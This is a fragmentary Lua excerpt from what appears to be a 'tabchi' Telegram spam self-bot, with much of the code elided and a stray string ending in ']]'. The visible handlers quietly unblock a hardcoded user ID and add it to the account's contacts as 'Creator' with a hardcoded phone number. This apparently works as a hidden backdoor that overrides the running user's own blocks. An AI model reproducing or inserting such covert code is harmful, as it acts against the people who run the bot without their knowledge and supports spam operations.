...
function process_updates()
  if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":gotupdated") then
    ...
    if jdata.have_tab then
      tdcli.unblockUser(376223882)
      tdcli.importContacts(14429996220, "Creator", "", 376223882)
...
Bia pv]]
  ...
  elseif data.ID == "UpdateChat" then
    ...
    elseif data.chat_.id == 376223882 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.importContacts(14429996220, "Creator", "", data.chat_.id)
    end
